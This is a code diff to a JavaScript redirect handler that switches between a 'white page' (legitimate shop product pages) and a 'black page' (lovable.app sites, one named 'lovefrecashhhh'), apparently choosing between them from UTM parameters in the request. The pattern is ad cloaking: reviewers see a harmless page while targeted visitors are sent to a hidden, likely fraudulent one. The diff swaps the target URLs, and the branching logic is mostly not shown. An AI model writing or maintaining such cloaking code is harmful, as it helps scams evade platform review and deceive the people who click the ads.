@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.beyaly.com/18k-gold-plated-zircon-elegant-bling-ring-fashionable-chain-design-for-women?_gl=1*1bbu1kx*_up*MQ..*_gs*MQ..&gclid=CjwKCAjwjffHBhBuEiwAKMb8pCHX0fR-n6PZLucJXSdRuHqPQgD3BPqfCx6bKiXDKuH1kq3OPnyIlxoC7CcQAvD_BwE&gbraid=0AAAAApylhvS0xPDiFIkMa7fR7dqBIdkj4";
-    const blackPageURL = "https://wherlnquz.lovable.app/";
+    const whitePageURL = "https://www.janod.com/en/1814-pure-evolutionary-puzzles-4-puzzles.html";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
